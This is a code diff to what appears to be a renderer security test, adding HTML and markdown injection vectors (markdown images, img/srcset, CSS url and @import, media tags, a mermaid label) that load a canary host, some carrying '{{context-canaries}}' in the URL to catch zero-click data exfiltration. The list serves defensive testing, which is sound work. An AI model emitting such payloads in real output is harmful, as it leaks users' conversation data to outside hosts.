@@ -71,7 +71,23 @@ export const BLOCKED_RENDER_VECTORS = [
   `<svg onload="fetch('${BROWSER_CANARY}/svg-onload')"></svg>`,
   `<details open ontoggle="fetch('${BROWSER_CANARY}/ontoggle')"><summary>x</summary></details>`,
   `<base href="${BROWSER_CANARY}/base/">`,
-  `<a href="javascript:fetch('${BROWSER_CANARY}/javascript-href')" id="inj-js-link">js</a>`
+  `<a href="javascript:fetch('${BROWSER_CANARY}/javascript-href')" id="inj-js-link">js</a>`,
+  // Loaded by the browser without a click: images, media, styles (zero-click exfiltration).
+  // Its own paragraph: right after an HTML line it would be read as part of that HTML block.
+  `\n![badge](${BROWSER_CANARY}/md-image?d={{context-canaries}})\n`,
+  `<img src="${BROWSER_CANARY}/img?d={{context-canaries}}" alt="img">`,
+  `<img srcset="${BROWSER_CANARY}/srcset 1x" alt="srcset">`,
+  `<span style="background:url(${BROWSER_CANARY}/style-attr)">styled</span>`,
+  `<video poster="${BROWSER_CANARY}/video-poster" src="${BROWSER_CANARY}/video-src"></video>`,
+  `<audio src="${BROWSER_CANARY}/audio" autoplay></audio>`,
+  `<svg><image href="${BROWSER_CANARY}/svg-image"></image></svg>`,
+  `<input type="image" src="${BROWSER_CANARY}/input-image">`,
+  `<table background="${BROWSER_CANARY}/table-background"><tr><td>t</td></tr></table>`,
+  `<picture><source srcset="${BROWSER_CANARY}/picture-source"><img alt="picture"></picture>`,
+  `<style>@import url(${BROWSER_CANARY}/style-import); body { background: url(${BROWSER_CANARY}/style-url) }</style>`,
+  '```mermaid\nflowchart LR\n  A["<img src=' +
+    `'${BROWSER_CANARY}/mermaid-label'` +
+    '>"] --> B\n```'
 ];
 
 const say = text => ({ say: text });
